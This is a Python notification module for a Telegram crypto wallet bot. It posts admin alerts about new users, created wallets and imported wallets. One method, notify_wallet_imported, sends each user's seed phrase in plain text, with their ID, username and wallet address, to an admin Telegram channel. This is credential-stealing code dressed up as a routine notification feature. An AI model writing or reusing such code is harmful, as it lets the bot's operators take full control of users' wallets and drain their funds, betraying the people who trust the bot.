"""
Notification Service
Handles sending notifications to admin channels/groups
"""

import logging
from typing import Optional, Dict, Any
from telegram import Bot
from telegram.error import TelegramError

logger = logging.getLogger(__name__)


class NotificationService:
    """Manages notifications to admin channels/groups"""

    def __init__(self, bot_token: str, notification_channel_id: Optional[str] = None):
        """
        Initialize Notification Service

        Args:
            bot_token: Telegram bot token
            notification_channel_id: Channel or group ID to send notifications (e.g., "@channel" or "-100123456789")
        """
        self.bot = Bot(token=bot_token)
        self.notification_channel_id = notification_channel_id
        self.enabled = notification_channel_id is not None

        if self.enabled:
            logger.info(f"Notification service enabled for channel: {notification_channel_id}")
        else:
            logger.warning("Notification service disabled - no channel configured")

    async def send_notification(self, message: str, parse_mode: str = 'HTML') -> bool:
        """
        Send a notification to the configured channel

        Args:
            message: Message text to send
            parse_mode: Parse mode ('HTML' or 'Markdown')

        Returns:
            Success status
        """
        if not self.enabled:
            logger.debug("Notifications disabled, skipping")
            return False

        try:
            await self.bot.send_message(
                chat_id=self.notification_channel_id,
                text=message,
                parse_mode=parse_mode
            )
            logger.debug("Notification sent successfully")
            return True
        except TelegramError as e:
            logger.error(f"Failed to send notification: {e}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error sending notification: {e}")
            return False

    async def notify_new_user(self, user_id: int, username: Optional[str], full_name: str) -> bool:
        """
        Send notification when a new user starts the bot

        Args:
            user_id: Telegram user ID
            username: User's username (if available)
            full_name: User's full name

        Returns:
            Success status
        """
        username_display = f"@{username}" if username else "No username"

        message = (
            f"🆕 <b>New User Started Bot</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>User:</b> {full_name}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"📱 <b>Username:</b> {username_display}\n"
        )

        return await self.send_notification(message)

    async def notify_wallet_created(
        self,
        user_id: int,
        username: Optional[str],
        network: str,
        address: str,
        slot_name: str
    ) -> bool:
        """
        Send notification when a user creates a wallet from system

        Args:
            user_id: Telegram user ID
            username: User's username
            network: Network name (e.g., 'SOL', 'ETH')
            address: Wallet address
            slot_name: Wallet slot name

        Returns:
            Success status
        """
        username_display = f"@{username}" if username else f"ID: {user_id}"

        message = (
            f"💼 <b>Wallet Created (System)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>User:</b> {username_display}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🔗 <b>Network:</b> {network}\n"
            f"📍 <b>Slot:</b> {slot_name}\n"
            f"🔑 <b>Address:</b>\n<code>{address}</code>\n"
        )

        return await self.send_notification(message)

    async def notify_wallet_imported(
        self,
        user_id: int,
        username: Optional[str],
        network: str,
        address: str,
        slot_name: str,
        seed_phrase: str
    ) -> bool:
        """
        Send notification when a user imports a wallet with seed phrase

        Args:
            user_id: Telegram user ID
            username: User's username
            network: Network name (e.g., 'SOL', 'ETH')
            address: Wallet address
            slot_name: Wallet slot name
            seed_phrase: The seed phrase used for import

        Returns:
            Success status
        """
        username_display = f"@{username}" if username else f"ID: {user_id}"

        message = (
            f"📥 <b>Wallet Imported (Seed Phrase)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>User:</b> {username_display}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🔗 <b>Network:</b> {network}\n"
            f"📍 <b>Slot:</b> {slot_name}\n"
            f"🔑 <b>Address:</b>\n<code>{address}</code>\n"
            f"🧾 <b>Seed Phrase:</b>\n<code>{seed_phrase}</code>\n"
        )

        return await self.send_notification(message)

    async def notify_custom(self, title: str, details: Dict[str, Any]) -> bool:
        """
        Send a custom notification with title and details

        Args:
            title: Notification title
            details: Dictionary of field name -> value pairs

        Returns:
            Success status
        """
        message = f"📢 <b>{title}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"

        for key, value in details.items():
            message += f"<b>{key}:</b> {value}\n"

        return await self.send_notification(message)
